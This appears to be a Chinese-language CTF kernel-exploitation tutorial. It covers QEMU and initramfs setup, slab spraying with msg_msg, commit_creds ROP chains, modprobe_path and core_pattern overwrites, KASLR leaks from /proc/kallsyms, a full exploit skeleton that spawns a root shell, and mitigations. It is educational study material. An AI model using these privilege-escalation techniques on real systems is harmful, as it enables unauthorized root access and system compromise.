# 内核 Pwn (Kernel Pwn)

## 准备环境

典型内核题包：

```text
kernel/
├── bzImage          # 压缩内核镜像
├── vmlinux          # 未压缩内核（带符号，用于 gdb）
├── initramfs.cpio.gz / rootfs.img
├── vuln.ko          # 漏洞驱动
├── run.sh           # qemu 启动脚本
└── (.config)        # 编译配置，可选
```

### 拆 initramfs 改 init 脚本

```bash
mkdir initramfs && cd initramfs
zcat ../initramfs.cpio.gz | cpio -idm
# 或 newc 格式：
# cpio -idm < ../initramfs.cpio

# 改 init 拿 root（CTF 学习用，真实题目通常 setuid 1000）
sed -i 's|setuidgid 1000|setuidgid 0|g' init
# 或注释掉 user 切换那一行

# 重新打包
find . | cpio -o --format=newc | gzip > ../initramfs.cpio.gz
cd ..
```

### 提取 vmlinux（如果只给了 bzImage）

```bash
# 用 extract-vmlinux 脚本（kernel 源码 scripts/）
/usr/src/linux/scripts/extract-vmlinux ./bzImage > vmlinux
```

### QEMU 启动参数模板

```bash
#!/bin/sh
qemu-system-x86_64 \
    -m 256M \
    -kernel ./bzImage \
    -initrd ./initramfs.cpio.gz \
    -cpu kvm64,+smep,+smap \
    -append "console=ttyS0 nokaslr quiet oops=panic panic=1" \
    -monitor /dev/null \
    -nographic \
    -no-reboot \
    -s    # 开 gdb 端口 1234
```

关键参数对应的保护：

| 参数 | 含义 | 影响利用 |
|------|------|---------|
| `+smep` | 内核态不能执行用户态代码 | 必须用 ROP，不能跳到用户态 shellcode |
| `+smap` | 内核态不能访问用户态数据 | rop 链不能放用户态，要放内核态（堆喷 / msgsnd） |
| `+pku` | Protection Keys | 类似 SMAP |
| `nokaslr` | 禁用 KASLR | 函数地址固定 |
| `kaslr` | 启用 KASLR | 必须 leak |
| `pti=on` | KPTI（Meltdown 修复） | 用户态返回需要 swapgs_restore_regs_and_return_to_usermode |

### 调试

```bash
# 终端 1
./run.sh   # 带 -s

# 终端 2
gdb vmlinux
(gdb) target remote :1234
(gdb) b vulnerable_ioctl
(gdb) c
```

GEF 推荐用 bata24 维护的 fork，对内核结构体有专门 pretty-print。

## 漏洞类型分流

| 漏洞 | 典型来源 | 利用基线 |
|------|---------|---------|
| 内核栈溢出 | copy_from_user 长度可控 | 栈金丝雀 + KASLR → ROP |
| 内核堆溢出 | kmalloc slab 越界写 | slab 喷射 + 覆盖相邻对象 |
| UAF | refcount 错误 / 双 free | 重新申请同 slab → 控制释放对象 |
| 整数溢出 | size 计算溢出 → 小分配大拷贝 | 实际是溢出，同上 |
| TOCTOU | 用户态指针二次解引用 | userfaultfd / FUSE 拖时间 |
| race | 双线程同时 ioctl | 卡时序窗口 |
| 任意读写 | 已经是终极原语 | 直接改 cred / modprobe_path |

## slab 喷射（堆 pwn 核心）

把可控大小的内核对象喷到漏洞 slab，覆盖目标对象。

| slab size | 喷射对象 | 优点 |
|-----------|---------|------|
| kmalloc-64 / 96 | `seq_operations` | 有函数指针，覆盖即控 IP |
| kmalloc-1024 | `tty_struct` | 有 ops 指针，结构精美 |
| kmalloc-4096 | `pipe_buffer` | 现代版主力，6.x 仍有效 |
| 任意 size | `msg_msg` | 大小可控（8 - 4096+），sysv msgsnd 控数据 |
| kmalloc-128 | `user_key_payload` | keyctl 系列接口 |

### msg_msg 喷射示例

```c
// 用户态触发
int msqid = msgget(IPC_PRIVATE, 0666 | IPC_CREAT);

struct {
    long mtype;
    char mtext[0x80 - 0x30];  // 加上 msg_msg 头 0x30 = kmalloc-128
} msg = { .mtype = 0x1337 };
memset(msg.mtext, 'A', sizeof(msg.mtext));

msgsnd(msqid, &msg, sizeof(msg.mtext), 0);   // 喷到 kmalloc-128
// ... 触发漏洞覆盖
msgrcv(msqid, &msg, sizeof(msg.mtext), 0, 0); // 读回看是不是被改了 → leak
```

## 提权路径

### 1. commit_creds(prepare_kernel_cred(0)) ROP

经典且通用。前提：能控 RIP（栈溢出 / vtable 劫持）。

```c
// 用户态 ROP 链
uint64_t rop[] = {
    pop_rdi,                          // pop rdi; ret
    0,                                // arg: 0
    prepare_kernel_cred,              // → 返回 root cred 到 rax
    pop_rdi,                          // pop rdi; ret
    /* 占位，下面 mov 会覆盖 */ 0,
    /* mov rdi, rax; ... ; ret */ 0,  // 转 rax→rdi（部分需要专门 gadget）
    commit_creds,                     // 设置当前进程 cred = root
    swapgs_restore_regs_and_return_to_usermode + 22,  // 跳过 push 序列
    0, 0,                             // rax, rdi 占位
    user_rip,                         // 用户态返回函数（保存了 cs/ss）
    user_cs, user_rflags, user_rsp, user_ss,
};
```

**关键 gadget**（要在 vmlinux 里 ROPgadget 找）:

```bash
ROPgadget --binary vmlinux --only "pop|ret" | grep 'pop rdi'
ROPgadget --binary vmlinux --only "mov|ret" | grep 'mov rdi, rax'
```

返回用户态前必须保存 cs/ss/rflags/rsp：

```c
void save_state() {
    __asm__(
        "movq %%cs, %0\n"
        "movq %%ss, %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp, %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp));
}
void shell() { system("/bin/sh"); }
```

### 2. modprobe_path 改 /tmp/x（最省事）

```text
原理：
  - 内核全局变量 modprobe_path 默认 "/sbin/modprobe"
  - 当 execve 一个不认识 magic 的文件时，内核调用 modprobe_path 以 root 执行
  - 改成 "/tmp/x"，写 /tmp/x（chmod +x），触发未知 magic 执行
  
适用：有任意写原语，但不一定能 ROP
```

```c
// 1. 准备 payload
system("echo -e '#!/bin/sh\nchmod +s /bin/su' > /tmp/x");
system("chmod +x /tmp/x");

// 2. 准备触发文件
system("echo -e '\\xff\\xff\\xff\\xff' > /tmp/trigger");
system("chmod +x /tmp/trigger");

// 3. 漏洞写：把 modprobe_path 改成 "/tmp/x\x00"
arbitrary_write(modprobe_path_addr, "/tmp/x\x00");

// 4. 触发
system("/tmp/trigger");
// 内核 root 跑 /tmp/x，做了 chmod +s /bin/su

// 5. 利用 setuid
system("/bin/su");
```

**modprobe_path 地址来源**：vmlinux 里符号，或 /proc/kallsyms（如果 kptr_restrict=0）。

### 3. core_pattern hijack

```text
类似思想：/proc/sys/kernel/core_pattern 控制 coredump 处理程序
改成 "|/tmp/x %P"，让进程崩溃时调用
缺点：需要触发 coredump，比 modprobe_path 笨重
```

### 4. 内核 ROP 关 SMEP/SMAP

如果就是想跳回用户态 shellcode（学习目的），可以 ROP 关 cr4 的 bit:

```c
// CR4: SMEP = bit 20, SMAP = bit 21
// 关 SMEP+SMAP 后，jmp 到用户态 shellcode 才能跑
uint64_t rop[] = {
    pop_rdi,
    0x6f0,                  // CR4 期望值（去掉 SMEP/SMAP 位）
    mov_cr4_rdi,            // "mov cr4, rdi; pop rbp; ret" 之类
    0,
    user_shellcode_addr,    // 跳过去（如果还没关 SMEP 这步会失败）
};
```

实际上**真实利用基本不走这条路** — 直接 commit_creds ROP 更短更稳。

## KASLR leak 渠道

| 来源 | 限制 | 备注 |
|------|------|------|
| /proc/kallsyms | `kptr_restrict=0` 才有真地址 | CTF 常常开放 |
| /sys/module/.../sections/.text | 同上 | 模块基址 |
| dmesg | `dmesg_restrict=0` 才能读 | oops 信息泄漏地址 |
| 内核栈未初始化读 | 漏洞本身要能任意读 | 残留地址 |
| msg_msg + 漏洞 leak | 喷射后 OOB read | 通用 |
| 旁路（Meltdown/Spectre） | KPTI 修了 Meltdown | 不通用 |
| SIDT/SGDT 用户态指令 | 老内核可能漏 | 现代基本封了 |

```c
// 经典：从 /proc/kallsyms 读
FILE *f = fopen("/proc/kallsyms", "r");
char line[256];
unsigned long commit_creds = 0;
while (fgets(line, sizeof(line), f)) {
    if (strstr(line, " commit_creds")) {
        commit_creds = strtoul(line, NULL, 16);
        break;
    }
}
unsigned long kbase = commit_creds - 0xXXXXX;  // 偏移看 vmlinux
```

## 完整 exploit 模板（用户态 + ioctl 触发 + ROP 提权 + shell）

```c
// exploit.c — 内核 pwn 通用骨架
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>

static unsigned long user_cs, user_ss, user_rflags, user_rsp;

static void save_state(void) {
    __asm__ volatile(
        "movq %%cs,   %0\n"
        "movq %%ss,   %1\n"
        "pushfq; popq %2\n"
        "movq %%rsp,  %3\n"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rflags), "=r"(user_rsp)
        :: "memory");
}

static void win(void) {
    if (getuid() == 0) {
        puts("[+] root!");
        system("/bin/sh");
    } else {
        puts("[-] not root");
    }
    exit(0);
}

// === KASLR base（先 leak 或 nokaslr 时直接写死） ===
#define KBASE_DEFAULT  0xffffffff81000000UL
#define OFF_COMMIT_CREDS         0x0xxxxx
#define OFF_PREPARE_KERNEL_CRED  0x0xxxxx
#define OFF_POP_RDI              0x0xxxxx
#define OFF_MOV_RDI_RAX          0x0xxxxx
#define OFF_SWAPGS_RESTORE       0x0xxxxx

int main(void) {
    save_state();

    // 1. leak KASLR base（这里假设 /proc/kallsyms 可读，或自己写一个 leak primitive）
    unsigned long kbase = leak_kbase();

    unsigned long prepare_kernel_cred = kbase + OFF_PREPARE_KERNEL_CRED;
    unsigned long commit_creds        = kbase + OFF_COMMIT_CREDS;
    unsigned long pop_rdi             = kbase + OFF_POP_RDI;
    unsigned long mov_rdi_rax         = kbase + OFF_MOV_RDI_RAX;
    unsigned long swapgs_restore      = kbase + OFF_SWAPGS_RESTORE + 22;

    // 2. 构造 ROP（在用户栈或在喷出来的 fake 栈上）
    unsigned long *rop = mmap((void*)0x100000, 0x1000,
                              PROT_READ|PROT_WRITE,
                              MAP_PRIVATE|MAP_ANON|MAP_FIXED, -1, 0);
    int i = 0;
    rop[i++] = pop_rdi;
    rop[i++] = 0;
    rop[i++] = prepare_kernel_cred;
    rop[i++] = mov_rdi_rax;
    rop[i++] = commit_creds;
    rop[i++] = swapgs_restore;
    rop[i++] = 0;  // rax
    rop[i++] = 0;  // rdi
    rop[i++] = (unsigned long)win;
    rop[i++] = user_cs;
    rop[i++] = user_rflags;
    rop[i++] = (unsigned long)(rop + 100);  // 临时 user rsp，可指 mmap 高处
    rop[i++] = user_ss;

    // 3. 触发漏洞，让内核 RIP 跳到 rop[0]
    int fd = open("/dev/vuln", O_RDWR);
    trigger(fd, rop);   // 题目相关：ioctl / write / read

    return 0;
}
```

## 学习参考：CVE-2022-0185

```text
漏洞：fs/fs_context.c 中 legacy_parse_param 长度计算有符号 / 无符号混淆
      → kmalloc 堆缓冲区溢出，size 任意，data 任意

为什么是好的学习样本：
1. 不需要 root 触发（unprivileged user namespace）
2. 溢出大小完全可控
3. 公开有完整 writeup + PoC
4. 综合了：user_ns 利用、msg_msg 喷射、UAF 后重占用、跨缓存利用

学习路径：
1. 编译带 CONFIG_USER_NS=y 的内核
2. 跑 Crusaders of Rust 的原版 PoC：https://www.openwall.com/lists/oss-security/2022/01/18/7
3. 看 willsroot.io 的官方 writeup（PortSwigger 收录的版本）
4. 手动重写：把 msg_msg 喷射改成 pipe_buffer 喷射版本（练习不同 slab 路径）
5. 加上 KASLR leak（原版用 /proc/kallsyms，挑战版禁用后改 OOB read）
```

主要技术点对应本文档的章节：

- 漏洞类型 → "内核堆溢出"
- 喷射对象 → "msg_msg 喷射"
- 提权方法 → "commit_creds ROP" 或 "modprobe_path"
- KASLR leak → "/proc/kallsyms" 或 "msg_msg + 漏洞 leak"

## 注意事项

- **CONFIG_RANDOM_KSTACK_OFFSET / RANDOMIZE_KSTACK_OFFSET_DEFAULT** 让内核栈基址每次 syscall 都随机偏移 0-1023，影响所有依赖固定栈偏移的利用
- **CONFIG_SLAB_FREELIST_RANDOM / HARDENED** 让 slab 内对象分配随机化，喷射成功率下降，要多喷
- **CONFIG_STATIC_USERMODEHELPER** 把 modprobe_path 设为只读 `static_usermodehelper_path`，modprobe 攻击失效
- **KPTI** 让用户态/内核态页表分离，返回用户态必须走 `swapgs_restore_regs_and_return_to_usermode` 这个 trampoline，不能直接 swapgs+iretq
- **FG-KASLR**（function-granular KASLR）让函数级别随机化，需要 leak 多个符号反推每个函数偏移
- **CET / IBT**（Intel 控制流强制）让间接跳转必须落在 ENDBR 指令，部分 gadget 失效
- **不要在内核里调 printk 输出测试** — 串口 IO 会改变时序，破坏 race；用一个 magic 寄存器值（rcx=0xdeadbeef）+ gdb watch 来调试
